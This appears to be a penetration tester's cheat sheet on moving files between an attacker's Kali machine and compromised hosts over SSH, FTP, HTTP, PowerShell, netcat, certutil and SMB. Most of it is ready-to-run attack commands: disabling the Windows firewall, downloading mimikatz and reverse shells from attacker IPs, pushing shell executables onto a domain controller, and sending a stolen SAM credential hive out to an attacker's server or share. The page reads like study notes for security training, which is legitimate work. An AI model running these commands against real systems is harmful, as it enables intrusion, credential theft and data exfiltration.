---
description: >-
  ls -la drwxrwxrwt (/usr/tmp ; /tmp ; /var/tmp) disable firewall: netsh
  firewall set opmode disable
---

# File transfer

```
rwx = 111 = 7
rw- = 110 = 6
r-x = 101 = 5
r-- = 100 = 4
-wx = 011 = 3
-w- = 010 = 2
--x = 001 = 1
```

#### SSH

Receiving: `service ssh start`

Sending: `scp {path of file to sd} {myuser}@{myip}:{saving path}` | `yes` | `{pwd}`

#### FTP `-a active mode`

Receiving: `get {remotefile} ({localfilename})`

Sending (ftp to taget from kali): `put {localfile} ({remotefilename})`

Limited-interaction transfer - kali `service pure-ftpd start`:

```
echo open {kali ip} 21> ftp.txt
echo USER kali >> ftp.txt
echo kaliftppwd(kali) >> ftp.txt
echo bin >> ftp.txt
echo GET/PUT the.file >> ftp.txt
echo bye >> ftp.txt
```

(GET from kali home ; PUT to /ftphome/)&#x20;

```
ftp -v -n -s:ftp.txt
```

#### HTTP

Serving (on working dir): `python -m http.server 80`

Downloading (on working dir): `wget {downloadip:80}/{file}` (-O)

&#x20;                                                  `curl {downloadip:80/filepath} > {savepath}`

#### Powershell

{% code overflow="wrap" %}
```
powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.156/mimikatz64.exe','C:/tmp/mimikatz.exe')
```
{% endcode %}

```
IWR -Uri http://192.168.45.5/file -OutFile C:\Users\Public\file
```

AD

{% code overflow="wrap" %}
```
copy C:\temp\rev.exe \\DC01\C$\tmp\rev.exe 
```
{% endcode %}

```
$dcs = NEW-PSSession -Computer SANDBOXDC
Invoke-Command -Session $dcs -ScriptBlock {ipconfig}
(validate we can exec cmd to DC remotely)

Copy-Item "C:\Users\Public\shell.exe" -Destination "C:\Users\Public\" -ToSession $dcs
```

#### Netcat

Serving: `nc -nlvp < file`

Getting: `nc -nv {ip} > file`

#### Powershell to kali `service apache2 start` `/var/www/uploads`

<pre data-overflow="wrap"><code><strong>powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.156/upload.php', 'C:\Users\Alice\Desktop\tmp\SAM')
</strong></code></pre>

#### Windows certutil.exe download

{% code overflow="wrap" %}
```

certutil.exe -urlcache -f http://IP/rev.jsp (C:\xampp\tomcat\webapps\rev.jsp)
```
{% endcode %}

#### smb

<pre><code><strong>
</strong><strong>sudo impacket-smbserver -ip 0.0.0.0 -port 445 smb $(pwd) -smb2support
</strong>
net view \\192.168.45.5\smb
dir \\192.168.45.5\smb

#get
copy \\192.168.45.5\smb\file .

#put
copy .\SAM \\192.168.45.5\share


may direct exec file in windows: \\192.168.45.5\smb\shell.exe
</code></pre>

{% embed url="https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb" %}

### xfreerdp drive share (or just host on http ser and browse to download)

{% embed url="https://www.mankier.com/1/xfreerdp" %}

{% embed url="https://miloserdov.org/?p=4516" %}
